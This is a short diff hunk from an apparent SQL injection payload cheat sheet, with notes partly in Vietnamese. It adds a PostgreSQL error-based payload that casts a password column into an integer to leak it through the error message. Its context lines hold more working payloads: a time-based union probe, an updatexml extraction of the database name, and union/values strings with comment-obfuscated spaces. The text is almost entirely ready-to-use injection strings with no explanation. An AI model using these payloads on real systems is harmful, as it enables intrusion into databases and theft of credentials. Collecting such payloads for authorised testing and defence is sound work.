@@ -37,6 +37,8 @@ Time base: '1)) union select 1,2,elt((select substr('abc',1,1) from information_
 
 Sử dụng updateXML: 1',updatexml(1,concat(0x7e,(select database()),0x7e),1))-- -
 
+Postgre: select * from rd_table where id='abc' order by id ASC,cast((select concat(p455w0rd_c0l) from m3mbr35t4bl3 limit 1 offset 0) as integer)-- -
+
 select name from demo where name = 'dasd' union values(char(97)||char(100)||char(109)||char(105)||char(110))
 
 1/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))
